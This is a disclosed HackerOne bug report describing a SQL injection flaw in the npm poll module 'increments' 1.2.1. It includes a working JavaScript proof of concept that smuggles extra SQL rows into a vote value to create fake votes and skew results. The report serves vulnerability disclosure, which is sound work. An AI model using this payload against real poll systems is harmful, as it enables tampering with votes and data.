# [H] [increments] sql injection

## Summary
Severity: High (CVSS 8.6)
Program: Node.js third-party modules
Weakness: SQL Injection
Reporter: verichains
State: resolved
Disclosed: 2020-02-02T23:02:09.387Z
Source: https://hackerone.com/reports/508346

## Details
I would like to report `SQL Injection` in `increments`.
It allows creating fake polls.

# Module

**module name:** `increments`
**version:** `1.2.1`
**npm page:** `https://www.npmjs.com/package/increments`

## Module Description

> Increment is a **database-driven** for creating  **polls** and taking **votes** for various options, candidates, or parties. Using MongoJS collections as a storage framework, Increments offers in-depth statistical data on generated polls.

## Module Stats

[45] downloads in the last week

# Vulnerability

## Vulnerability Description

This module does not escape voting data allowing attacker to create fake votes.

## Steps To Reproduce:

- `npm install increments`
- run poc:

```javascript
const increments = require('increments');
increments.setup('mysql://root:@localhost:3306/test');
increments.poll('fruits', [{name:'Apples'},{name:'Bananas'},{name:'Oranges'},{name:'Pears'}]);
increments.vote('fruits', 'Oranges","0","0","1","0","0","0","0","","0")'+',(123,"Oranges","0","0","1","0","0","0","0","","0")'.repeat(10)+'#');
increments.statistics('fruits', function(e, f) {
	console.log( f.projectedWinner );
	process.exit(0);
});
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/508346_
